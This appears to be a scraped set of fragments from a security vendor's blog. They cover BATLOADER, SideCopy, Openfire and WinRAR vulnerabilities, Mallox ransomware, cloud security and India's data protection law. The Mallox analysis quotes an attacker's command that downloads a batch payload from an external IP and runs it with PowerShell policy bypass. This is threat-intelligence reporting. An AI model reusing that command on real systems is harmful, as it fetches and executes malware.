They meticulously plan and execute well-defined, strategic attacks that unfold in stages. A typical malware attack comprises various infection phases. This process unfolds step by step, ultimately leading to the activation of the core malicious payload. These stages not only attempt to evade anti-malware defenses but also aim to establish a hidden presence within the system, often remaining dormant for a period before any further action. These initial stages of an attack are primarily focused on implanting the final payload into the system.</p>\n<p>The final payload is often a well-known malware family with a different variant. However, the initial stage remains surprisingly the same. This is not just limited to different variants of the same malware family but also  others.  Recently, a batloader has emerged as a standard method for delivering the final payload of AgentTesla, a well-known InfoStealer.</p>\n<p>A batloader is a batch file that, once executed, performs further malicious activities in the system. The same batloader has been identified in distributing other malware families,  such as Ransomware, RATs, and Cryptojackers.</p>\n<p>The initial stage often relies on various phishing techniques to trick victims into downloading either a loader or a downloader. A loader is a harmful software with a malicious payload embedded, while a downloader is a program that directly fetches the payload from a command and control (CnC) server. The complexity of this process may vary, depending on how challenging the threat actors want it to be for malware analysts and researchers to dissect the sample.</p>\n<p>Here, we&#8217;ll explore the process of deploying the batloader, which loads an exe file into the memory. We&#8217;ll focus on AgentTesla for simplicity, but note that the same approach applies to the other malware families mentioned above.</p>\n<p><strong>Technical Analysis:</strong></p>\n<p><img class=\"alignnone size-full wp-image-5900\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig1-InfectionChain.png\" alt=\"\" width=\"693\" height=\"339\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig1-InfectionChain.png 693w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig1-InfectionChain-300x147.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig1-InfectionChain-330x160.png 330w\" sizes=\"(max-width: 693px) 100vw, 693px\" /></p>\n<p style=\"text-align: center;\">Fig 1: Infection Chain</p>\n<p>The initial step often involves tricking victims into running the malicious file. This can happen when a user opens the file out of curiosity or through other techniques used to persuade them. In some cases, threat actors exploit vulnerabilities in the system to bypass this first step.</p>\n<p>In this case, the bat file is the malicious sample that needs to be executed by the user by any of the above-mentioned means. While analyzing this bat file, we observe that this is highly obfuscated.</p>\n<p><img class=\"alignnone size-full wp-image-5901\"

This file is injected into a process, and depending on the specific malware family, it moves forward to infect the device. In many cases, this executable establishes a connection with the Command and Control (CnC) server to retrieve another payload. This final payload is what ultimately infects the machine. Nevertheless, we&#8217;ve also observed instances where this executable directly infects the machine without needing to download an additional payload.</p>\n<p>In this particular case, the malware is a variant of AgentTesla, which falls under the category of InfoStealer.</p>\n<p><strong>Conclusion:</strong></p>\n<p>In recent cases, we&#8217;ve seen this batloader employed for injecting AgentTesla. However, it&#8217;s not limited to just this malware strain. This batloader has been frequently observed facilitating the injection of other malware families as well. While there may be slight variations in the code, the underlying method remains remarkably consistent. This underscores the adaptability and widespread usage of this particular batloader in malicious activities. The key similarities are:</p>\n<ul>\n<li>Bat file copying Powershell from system32 to a new name as .bat/png.exe</li>\n<li>Removing the exe from the end to make use of the same bat script</li>\n<li>An obfuscated PowerShell script is extracted and  run from the bat script</li>\n<li>The PowerShell script finds some obfuscated payload from the bat</li>\n<li>Base64 Decodes the payload</li>\n<li>Decompresses the file</li>\n<li>Reverse the final payload</li>\n<li>A dot net file is observed</li>\n</ul>\n<p>While there may be some variation, these steps are typically followed. Initially, this batloader was utilized through OneNote attachments to propagate malware such as QuasarRAT and AsyncRAT. However, we&#8217;ve also noted instances where the batloader was employed to distribute Mallox Ransomware, AgentTesla, and a Cryptojacker. Essentially, it serves as a tool for orchestrating multi-staged attacks, ensuring the final payload is delivered to execute its malicious intent.</p>\n<p><strong>How Does SEQRITE Protect Its Customers?</strong></p>\n<p>BatLoader.Trojan.48264.GC</p>\n<p>Bat.AgentTesla.48158.GC</p>\n<p>Bat.Mallox.48121.GC</p>\n<p><strong>IOCs:</strong></p>\n<p>764250ddf94b90441193fe1c29754f231e0868d1878fdf3150e5744dd8d8c378</p>\n<p>d71cdb791f3f58bd064fb840488f7e708d707b1d39e70fbe5c597f7fbcc0699e</p>\n<p>fa78bb7d250a3893f188e5e7651070a20dd690fc6647020d5d399874e71c8e88</p>\n<p>184eaf1cfa3460a8fe544c6d3d253c18ac50ba18acb718d6a2707e25400a5eab<br />\n108e07174511fa58ece920149d6b2f26f386b33f5e54bfbbb758b9c3b6cae362<br />\n24f3f9ada9ef84eb3bb749de500e43c85640d8c0140ebe6d7573520f61bfe5f7<br />\n7af0a77161be52ad53fdb2ae9a06cbd9eaf8d59be43c642901efcbb5c03d30e3</p>\n<p>5158b0a023299c1922423a065b9825fd1769f1a87ffd2031375a0e893d523318</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/casting-light-on-batloader-an-insight-into-its-role-in-malware-delivery/\" data-wpel-link=\"internal\" target=\"_self\">Casting Light on BATLOADER: An Insight into its Role in Malware Delivery</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"

The compromised domains, used to host payloads by SideCopy, are reused multiple times, resolving to the same IP address.

Its arsenal includes Action RAT, AllaKore RAT, Reverse RAT, Margulas RAT and more.</p>\n<p>This group is associated as a sub-division of Transparent Tribe (APT36), which has been persistently targeting the <a href=\"https://www.seqrite.com/blog/transparent-tribe-apt-actively-lures-indian-army-amidst-increased-targeting-of-educational-institutions\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">Indian Military</a> and is continuing to target <a href=\"https://www.seqrite.com/resources/transparent-tribe-apt-actively-lures-indian-army-amidst-increased-targeting-of-educational-institutions\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">university students</a> aggressively this year to share student data, possibly with terrorist groups for recruitment. It has updated its Linux malware arsenal this year with Poseidon and other utilities.

Based on the attack chain, selection of target, baits used and infrastructure; these campaigns are attributed to SideCopy with high confidence. APT36 is expanding its Linux arsenal constantly, where sharing its Linux stagers with SideCopy is observed to deploy an open-source Python RAT called Ares. At the same time, we have observed telemetry hits for this campaign in multiple Indian cities, showing an uptick in activity amidst the Israel-Hamas conflict. Overall, both these and additional campaigns have connections to the sharing of code and infrastructure between these closely related threat groups.</p>\n<h2><b>SEQRITE

It facilitates instant messaging, group chat, and other real-time communication services. Openfire is popular for its flexibility, scalability, and robust security features. It is commonly used in organizations and educational institutions, and even as a foundation for building custom chat and collaboration applications. Its ease of use and extensive plugin support have contributed to its widespread adoption for both internal team communication and customer-facing chat solutions.</p>\n<p>A recent discovery in May unveiled a fresh security concern (CVE-2023-32315) associated with the Openfire console. This vulnerability, characterized as a path traversal flaw, explicitly targets the setup environment. Exploiting this weakness empowers unauthorized users to compromise the unauthenticated Openfire Setup Environment within an established configuration. Subsequently, malicious actors can infiltrate admin setup files usually confined to the Openfire Admin Console&#8217;s access. This could lead to two significant actions: adding an admin user to the console or uploading a plugin, potentially securing complete control over the server.</p>\n<h3>CVE-2023-32315</h3>\n<p>The cause of vulnerability CVE-2023-32315 stemmed from an existing path traversal protection mechanism that was in place to guard against precisely this type of attack. However, it could not fend off specific non-standard URL encoding techniques involving UTF-16 characters. These particular encoding methods were not supported by the embedded web server in use at the time, rendering the path traversal defenses ineffective in such scenarios.</p>\n<p>This vulnerability impacts all Openfire versions released since April 2015, beginning with version 3.10.0. The issue has been addressed in Openfire releases 4.7.5 and 4.6.8, with additional enhancements planned for the upcoming initial release of the 4.8 branch, expected to be named version 4.8.0.</p>\n<h3>Path Traversal to Remote Code Execution</h3>\n<p>After a thorough examination of <a href=\"https://packetstormsecurity.com/files/174222/Greenshot-1.3.274-Deserialization-Command-Execution.html\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">publicly accessible</a> <a href=\"https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">exploits</a>, we proceed to deconstruct the attack sequence as follows:</p>\n<ul>\n<li><strong>Token Acquisition Phase: </strong></li>\n</ul>\n<p>Obtain the necessary session tokens, such as the JSESSION ID and CSRF.</p>\n<p><img class=\"size-full wp-image-5836 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/09/Picture1-1.png\" alt=\"\" width=\"602\" height=\"182\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/09/Picture1-1.png 602w, https://www.seqrite.com/blog/wp-content/uploads/2023/09/Picture1-1-300x91.png 300w\" sizes=\"(max-width: 602px) 100vw, 602px\" /></p>\n<p style=\"text-align: center;\"><em>Acquiring session token</em></p>\n<ul>\n<li><strong>Directory Traversal and Administrative Action Phase:</strong></li>\n</ul>\n<p>Utilize these acquired tokens with directory traversal techniques to carry out administrative actions.

They can extract valuable information from infected systems, including hardware details, network configurations, browsing history, and sensitive data related to finance and online activities. Over time, stealer malware has evolved to evade detection and security measures. Some use advanced obfuscation techniques and rootkit functionality to hide their presence and remain undetected by traditional antivirus software.</p>\n<p>Stealer malware is often distributed through various methods, including malicious email attachments, infected software downloads, drive-by downloads from compromised websites, and social engineering techniques.</p>\n<h3><span data-preserver-spaces=\"true\">Infection chain</span></h3>\n<ul>\n<li><span data-preserver-spaces=\"true\">The attacker creates a Telegram Bot Account and inserts a Bot token into an executable.</span></li>\n<li><span data-preserver-spaces=\"true\">The attacker deploys the executable as an email attachment and sends it to the victim’s mail.</span></li>\n<li><span data-preserver-spaces=\"true\">When the victim opens the mail, the executable gets downloaded and starts its execution.</span></li>\n<li><span data-preserver-spaces=\"true\">It acts as a loader and downloads the dropper component.

Yes, and when the cloud is hacked – it is not just data at risk!</em></strong></p>\n<p>The emerging digital ecosystem is treacherous. Today, every company, whether large or small, is a reachable target with operations, brand, reputation, and revenue pipelines at stake. Cloud security has become a massive issue, and hackers use system weaknesses to breach sensitive data.</p>\n<p>While cybersecurity capabilities and awareness seem to be improving, unfortunately, the threat and sophistication of cyberattacks match that progress. For 2023 and beyond, the focus needs to be on the cyberattack surface and vectors to determine what can be done to mitigate threats and enhance resiliency and recovery. Examining the framework behind these cloud vulnerabilities is more crucial than ever.</p>\n<p>This blog explains what cloud security is and the challenges that come with it, as well as some effective platforms for implementing cloud security solutions.</p>\n<h3><strong>What is cloud security? </strong></h3>\n<p>Numerous enterprises have been harnessing the capabilities of cloud-based technologies to gain benefits in terms of agility, flexibility, and scalability. But, moving to the cloud comes with the fundamental question of effectively managing security and risk posture.</p>\n<p>Cloud security is vital to address external and internal business security threats. It is a collection of policies, procedures and technology designed to provide multi-level protection from cybersecurity breaches, support regulatory data compliance, user and device authentication, and ensure data privacy.</p>\n<p>Traditional IT involves on-site device setup and maintenance, giving organizations more control over their data environment and a stronger cybersecurity stance. However, they are costlier and hamper scalability.</p>\n<p>Migrating to the cloud, such as AWS, GCP, and Azure, maximizes cost-saving opportunities and makes data management easier for organizations. It helps to proactively protect data, applications, and workloads running with unmatched speed, agility, and efficiency.</p>\n<h3><strong>Why is cloud security important? </strong></h3>\n<p>Cloud security isn’t just about securing the cloud – it’s about securing endpoints, networks, workloads, applications, interfaces, and data hosted on the cloud. Many cloud computing providers offer built-in features and controls to protect the infrastructure, data, and workloads running on the cloud. Some of the significant benefits of cloud security are described below.</p>\n<ul>\n<li><strong>Better visibility against threats</strong></li>\n</ul>\n<p>Cloud security offers better visibility into endpoints, networks, workloads, IAAS, PAAS and SAAS applications, aiding swift threat detection across multiple clouds. With AI-powered tools, organizations can seamlessly monitor and pre-empt malicious actions and get threat intelligence, up-to-date insights, and protection guidance.</p>\n<ul>\n<li><strong>Cloud Security Posture Management</strong></li>\n</ul>\n<p>Cloud security posture management (CSPM) automates identifying and remediating risks across cloud infrastructures. It plays a significant role in risk visualization and assessment, incident response, compliance monitoring, and DevOps integration. It helps to uniformly apply best practices for cloud security to hybrid, multi-cloud, and container environments like Kubernetes, EKS, and IAC, like AWS Lambda.</p>\n<ul>\n<li><strong>Efficient recovery</strong></li>\n</ul>\n<p>Cloud computing conveys quicker and more exact recoveries of applications and information with less downtime. Cloud Workload Protection tools ensure that cloud workloads are recovered in the face of an attack without any disruption to service.</p>\n<ul>\n<li><strong>Centralized data security </strong></li>\n</ul>\n<p>Cloud computing offers centralized control to safeguard sensitive data and applications on numerous endpoints spread across locations. This enables companies to perform tasks seamlessly, such as application and data discovery, disaster recovery, network event monitoring, and web filtering.</p>\n<ul>\n<li><strong>Flexibility and scalability </strong></li>\n</ul>\n<p>The centralized nature of cloud security enables organizations to scale with new demands and easily integrate more applications and data storage without compromising safety. It also adjusts during high traffic, bolstering security during upgrades and reducing during low usage.</p>\n<ul>\n<li><strong>Improved DDoS protection</strong></li>\n</ul>\n<p>Distributed Denial of Service (DDoS) attacks are some of the biggest threats to cloud computing. With the increased visibility that native cloud management brings, Cloud security protects your servers by monitoring, identifying, and analyzing these attacks.</p>\n<ul>\n<li><strong>Autonomous response</strong></li>\n</ul>\n<p>AI and machine learning-powered cloud security tools are effective against complex cyberattacks. They enhance cybersecurity by automating detection, prevention, analysis, and response to attack scale and velocity.</p>\n<h3><strong>How does SEQRITE help with frictionless cloud security and compliance?</strong></h3>\n<p>Integrating the cloud into your enterprise cybersecurity involves more than adding controls.

These vulnerabilities pose a grave concern due to their potential for remote code execution, presenting a severe threat risk.</p>\n<p>WinRAR is a popular compression tool with half a billion users worldwide and plays an integral role in countless digital operations. This fact heightens the probable impact of these vulnerabilities, as any exploitation could severely affect the digital landscape.</p>\n<p>These vulnerabilities require user interaction for exploitation. Remote attackers, with malicious intent, can execute arbitrary code on systems where WinRAR is installed. The software&#8217;s functionality, which includes archive creation in RAR or ZIP file formats, displays and unpacks numerous archive file formats. This further amplifies the potential for compromise as WinRAR’s ability to support the creation of encrypted archives, multi-part files, and self-extraction adds to the situation&#8217;s complexity. Furthermore, file integrity is verified using CRC32 or BLAKE2 checksum for each file within an archive, highlighting the significance of these gaps in the system.</p>\n<p>This advisory is our detailed analysis and report of the above findings.<strong> </strong></p>\n<p><strong>Why is Immediate Action Required against these Vulnerabilities?</strong></p>\n<p>Users using WinRAR version older than 6.23 are at risk. These vulnerabilities allow users to execute arbitrary code when attempting to view a benign file in a ZIP archive. The issue occurs when a ZIP archive may include a benign file (such as an ordinary .JPG file) and a folder with the same name as the benign file. The folder&#8217;s contents (which may include executable content) are processed while attempting to access only the benign file. This was the gap being exploited in the wild from April through August 2023 by threat actors. Breach attempts were made on online cryptocurrency trading accounts through these vulnerabilities.<strong> </strong></p>\n<p><strong>CVE-2023-40477 =&gt; Recovery Volume, Improper Validation of Array Index: Remote Code Execution Vulnerability</strong></p>\n<p>Users who open specially crafted WinRAR archives on their devices may fall prey to the attack. The downloading of such a specially crafted archive and the opening of it on the user&#8217;s system is sufficient to allow attackers to execute arbitrary code on the device.</p>\n<p>The issue, identified as CVE-2023-40477, is a high-severity vulnerability that exists in the processing of recovery volumes. A buffer overflow is possible when processing recovery volume names in the old RAR 3.0 format. To trigger this vulnerability, the user must start unpacking a RAR file in the same folder as a recovery archive file with a malformed name. The vulnerability exists in the processing of recovery volumes and results from a lack of proper validation of user-supplied data. This can lead to memory access beyond the end of an allocated buffer.</p>\n<p><span style=\"text-decoration: underline;\"><em>Software using WinRAR libraries was also affected.</em></span></p>\n<p>The libraries unrar.dll and unrar64.dl are vulnerable. The libraries &#8220;unrar.dll&#8221; and &#8220;unrar64.dll&#8221; used by WinRAR are used in many software products (including virus scanners). If old versions of the libraries are used there, the vulnerabilities mentioned above also exist there. In the case of virus scanners, this is even more critical than with WinRAR since the anti-virus software usually runs with elevated privileges.</p>\n<p><strong>CVE-2023-38831 =&gt; File Extension Spoofing Vulnerability</strong></p>\n<p><img class=\"size-full wp-image-5816 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/09/Picture1.png\" alt=\"\" width=\"734\" height=\"386\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/09/Picture1.png 734w, https://www.seqrite.com/blog/wp-content/uploads/2023/09/Picture1-300x158.png 300w\" sizes=\"(max-width: 734px) 100vw, 734px\" /></p>\n<p style=\"text-align: center;\"><span class=\"TextRun SCXW145706557 BCX0\" lang=\"EN-GB\" xml:lang=\"EN-GB\" data-contrast=\"auto\"><span class=\"NormalTextRun SCXW145706557 BCX0\" data-ccp-parastyle=\"Body Text\">Figure 1: </span><span class=\"NormalTextRun CommentStart CommentHighlightPipeRest CommentHighlightRest SCXW145706557 BCX0\" data-ccp-parastyle=\"Body Text\">Opening </span><span class=\"NormalTextRun CommentHighlightRest SCXW145706557 BCX0\" data-ccp-parastyle=\"Body Text\">the crafted</span> <span class=\"NormalTextRun SCXW145706557 BCX0\" data-ccp-parastyle=\"Body Text\">a</span><span class=\"NormalTextRun SCXW145706557 BCX0\" data-ccp-parastyle=\"Body Text\">rchive results in launching calculator before the actual PDF file is </span><span class=\"NormalTextRun SCXW145706557 BCX0\" data-ccp-parastyle=\"Body Text\">opened.</span></span><span class=\"EOP SCXW145706557 BCX0\" data-ccp-props=\"{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335559685&quot;:103,&quot;335559737&quot;:464,&quot;335559738&quot;:147,&quot;335559740&quot;:309}\"> </span></p>\n<p>On opening the archives, users cannot differentiate the harmless files hiding the malicious payload.

With its ability to encrypt all volumes, including local and network-shared drives, it gradually spreads control over the system, leaving victims in digital despair.</p>\n<p>Mallox Ransomware uses the “.mallox” extension on the encrypted files as it drops its ‘ransom note’ with the name &#8211; “File Recovery.txt,” which contains the unique “tor” link for further communication between the attacker and the unsuspecting users.</p>\n<p>In this blog, we will take you deep into our research of the Mallox Ransomware, to help you understand how stealthily it works, as well as update you on how to stay protected.<strong> </strong></p>\n<p><strong>Attack Vector:</strong></p>\n<p>Our investigation indicates that Mallox (aka TargetCompany) Ransomware is currently targeting unsecured Microsoft SQL Servers as an attack vector to infiltrate victims&#8217; systems and distribute the ransomware.</p>\n<p>Furthermore, we have noticed multiple failed and erroneous attempts on publicly exposed MSSQL servers to gain initial access to the victims&#8217; network. This pattern indicates MSSQL brute force attacks and highlights these servers&#8217; pivotal role as the primary point of entry into the victim’s system.</p>\n<p>It is observed that, as it gains initial access to the unsecured MSSQL instance via brute force attacks, it uses the MSSQL service ‘sqlservr.exe’ command line to infiltrate the malicious files and payload onto the victim&#8217;s machine.</p>\n<p><em>&#8220;C:\\WINDOWS\\\\System32\\\\cmd.exe&#8221; /C echo $cl = New-Object System.Net.WebClient &gt;%TEMP%\\updt.ps1 &amp; echo $cl.DownloadFile(&#8220;http[:]//43[.]138[.]76[.]102/Mfhigwwvsie[.]bat&#8221;, &#8220;%TEMP%\\tzt.bat&#8221;) &gt;&gt; %TEMP%\\updt.ps1 &amp; powershell -ExecutionPolicy Bypass %TEMP%\\updt.ps1 &amp; WMIC process call create &#8220;%TEMP%\\tzt.bat&#8221;</em></p>\n<p><strong>Infection Chain:</strong></p>\n<p>During the execution of tzt.bat, it injects the ransom code in the Aspnet_Complier.exe, and then drops and executes the killer.bat file, which deletes all the unwanted services and kills all the tasks so that the encryption process is successful.</p>\n<p><img class=\"size-full wp-image-5808 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/08/1_Infection-chain.png\" alt=\"\" width=\"569\" height=\"253\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/08/1_Infection-chain.png 569w, https://www.seqrite.com/blog/wp-content/uploads/2023/08/1_Infection-chain-300x133.png 300w\" sizes=\"(max-width: 569px) 100vw, 569px\" /></p>\n<p style=\"text-align: center;\"><em>Fig: Infection chain</em></p>\n<p><strong>Technical Analysis Of Payload:</strong></p>\n<p>The Bat file executes the .NET payload “Mfhigwwvise.exe,” which is responsible for the injection of ransomware code.</p>\n<p>During the analysis of the .NET payload, it was discovered that it downloads another encrypted VDF payload from the “hxxps://files.catbox.moe/r6piiq.vdf, which is encrypted with AES Cipher &#8211; As shown in the figure below.</p>\n<p>This further decrypts directly into the memory.</p>\n<p><img class=\"alignnone size-full wp-image-5783\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/08/b2.png\" alt=\"\" width=\"892\" height=\"478\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/08/b2.png 892w, https://www.seqrite.com/blog/wp-content/uploads/2023/08/b2-300x161.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/08/b2-768x412.png 768w\" sizes=\"(max-width: 892px) 100vw, 892px\" /></p>\n<p style=\"text-align: center;\"><em>Fig: Downloading VDF from C2</em></p>\n<p><img class=\"alignnone size-full wp-image-5784\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/08/b3.png\" alt=\"\" width=\"888\" height=\"392\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/08/b3.png 888w, https://www.seqrite.com/blog/wp-content/uploads/2023/08/b3-300x132.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/08/b3-768x339.png 768w\" sizes=\"(max-width: 888px) 100vw, 888px\" /></p>\n<p style=\"text-align: center;\"><em>Fig: Decrypted VDF payload</em></p>\n<p>The Decrypted DLL file is further obfuscated with an IntelliLock obfuscator.

Follow these recommended steps to enhance the security of your SQL Server environment:</p>\n<ol>\n<li><strong>Firewall Protection/Limiting Access:</strong> Utilize a firewall to restrict access to SQL servers. Allow incoming traffic only from trusted networks and IPs. Specifically, block incoming traffic on port 1433 except for authorized users.</li>\n<li><strong>Change Default Port:</strong> Avoid exposing SQL Servers on the default port (1433) over the Internet, as it&#8217;s a common target for hackers. Consider using a secure connection like a VPN for accessing SQL servers remotely.</li>\n<li><strong>Secure Account Management:</strong> Disable the ‘sa’ (system administrator) account or set a strong, unique password to minimize unauthorized access risks. The sa account holds high privileges.</li>\n<li><strong>Strong Passwords:</strong> Enforce strong, unique passwords for all SQL logins. Utilize a mix of upper- and lower-case letters, numbers, and special characters to enhance password security.</li>\n<li><strong>Account Lockout Policies:</strong> Implement account lockout policies that temporarily lock out SQL Server logins after multiple failed attempts. This deters brute force attacks.</li>\n<li><strong>Audit SQL CLR Assemblies:</strong> Review and deactivate SQL CLR assemblies that are not essential. Routinely assess and remove any redundant assemblies to mitigate potential vulnerabilities.</li>\n<li><strong>Encrypt Data in Transit:</strong> Utilize SSL/TLS protocols to encrypt data during transmission between clients and SQL servers. This safeguards against potential eavesdropping and data interception.</li>\n<li><strong>Keep an Eye on SQL Server Activity: </strong>Utilize SQL Server auditing to meticulously track and log every operation within your SQL Server instance. By actively monitoring these activities, you can swiftly detect and address any potential security risks.</li>\n<li><strong>Stay Updated:</strong> Regularly apply the latest updates and patches to your SQL Server instance, Operating System and other installed applications. This helps mitigate known vulnerabilities and ensures ongoing security.</li>\n</ol>\n<p><strong>Precautionary Measures For Minimizing Shared Data Damage Within The Network:</strong></p>\n<ul>\n<li><strong>Restricting Access to Shared Folders:</strong> Use network separation to limit access to shared folders only to those who need it. Apply strong access controls to ensure that only authorized individuals can change shared data on the network.</li>\n<li><strong>Regular Data Backups:</strong> Consistently back shared data to a secure and isolated location. Periodically test backups to verify data integrity and to ensure a swift data restoration process in the event of an attack.</li>\n<li><strong>Scheduled Offline Backups:</strong> Maintain offline backups of critical shared data to protect against ransomware attacks that may attempt to encrypt live/online backups.</li>\n</ul>\n<p>By adhering to these precautions, we can significantly reduce the risk of Mallox Ransomware attacks targeting Microsoft SQL Server instances and bolster the overall security posture of our environment.</p>\n<p><strong>How Does SEQRITE Protect Its Customers From Mallox Ransomware?</strong></p>\n<p>SEQRITE’s AntiVirus has signatures for various script files utilized in the attack, as well as for the Ransom payload.

With India gradually emerging as a data-driven economy, the recent Digital Personal Data Protection (DPDP) Act 2023 aims to revolutionize data protection and privacy, keeping in mind the legitimate interests of businesses that leverage personal data for various purposes.</p>\n<p>The Act ushers in a new era in India&#8217;s digital development journey that concerns almost 700 million Indians who are digitally connected today. But what will its impact be on businesses across various industries?</p>\n<p>With the increased need for data protection and cybersecurity measures to fortify defence against cyberattacks and data breaches, the Act establishes standards for businesses to process and comply with the law. This blog brings you the Act&#8217;s key features and potential implications for businesses.</p>\n<h3><strong>The 7 key features of India&#8217;s Data Protection Act</strong></h3>\n<ol>\n<li><strong>Consent Management </strong></li>\n</ol>\n<p>Businesses must seek explicit user permission before collecting personal data to ensure transparency and user control. Users should be fully aware of what data is being collected, how it will be used, and the purpose for which it will be processed. Organizations must use the data legally, reasonably, and transparently for the individuals concerned.</p>\n<ol start=\"2\">\n<li><strong>Application of the Act</strong></li>\n</ol>\n<p>Businesses based in India or operating from a foreign location &#8211; that process the personal data of Indian citizens to offer them goods or services – will come under the purview of India&#8217;s Data Protection Act. This ensures that Indian users&#8217; data privacy is maintained during cross-border data processing.</p>\n<ol start=\"3\">\n<li><strong>Data minimization and accurate collection</strong></li>\n</ol>\n<p>The Act required businesses to collect only as much personal data as necessary to serve the specified purpose. The collection can be done through online platforms, websites, mobile apps, electronic systems, physical records, or documents digitized later.</p>\n<ol start=\"4\">\n<li><strong>Obligations of Data Fiduciaries</strong></li>\n</ol>\n<p>Data fiduciaries will be obligated to maintain the accuracy and completeness of data, keep data safe and secure, and delete data once its purpose has been met. The data storage should be limited to a fixed duration appropriate for its purpose.</p>\n<ol start=\"5\">\n<li><strong>Fines and Penalties</strong></li>\n</ol>\n<p>The Act introduces significant penalties as high as Rs. 250 crore for data breaches and non-compliance, affecting enterprises&#8217; financial performance and reputation.</p>\n<ol start=\"6\">\n<li><strong>Protection of Children&#8217;s Data</strong></li>\n</ol>\n<p>Data Fiduciaries must get verifiable parental consent before processing data related to children. A significant change is that they can&#8217;t track, watch behaviours, or show targeted ads to children.</p>\n<ol start=\"7\">\n<li><strong>Reasonable Safeguards</strong></li>\n</ol>\n<p>The Act takes a holistic approach to protect all personal data equally without differentiating between personal and sensitive personal data, aiming to ensure reasonable safeguards of data at the same level and that there is no unauthorized collection or processing of personal data.</p>\n<h3><strong>What does the Act mean for businesses?</strong></h3>\n<p>While the DPDP framework adopts a more liberal and improved approach to data protection and privacy, it compels companies to review their current privacy practices, use privacy-enhancing technologies, and educate their employees about the proper management of personal data.</p>\n<p>The Act strikes an essential balance between protecting users&#8217; rights and promoting innovation in digital businesses. The established cross-border data transfer will help attract foreign investments, boost startups, ease compliance, and enable the Government to address the data transfer issues effectively. The Act does not mandate local storage of personal data, allowing cost optimization and simplified compliance.</p>\n<p>Data protection regulations can be uncertain, but they don&#8217;t have to be a stumbling block for businesses that proactively protect personal data. The Act fosters a culture of vigilance, enabling organizations to perform gap assessments and redress strategies by investing in robust cybersecurity measures to protect customer data and maintain a strong security posture against cyber adversaries.</p>\n<h3><strong>How SEQRITE Can Keep Businesses Compliant with the Law?</strong></h3>\n<p>SEQRITE is ready to support businesses and navigate India&#8217;s Digital Personal Data Protection Act using advanced cybersecurity solutions. Our host of tools and solutions can help businesses across industries comply with data minimization, purpose limitation, and data accuracy.</p>\n<ul>\n<li><strong>Data Privacy Management System (HawkkScan)</strong></li>\n</ul>\n<p>Improving data handling and compliance starts with &#8216;Data Discovery and Classification&#8217;. Our intuitive data privacy management solution, HawkkScan, helps business and government entities (Data Fiduciaries) to discover, categorize, and identify sensitive information scattered throughout their data landscape.
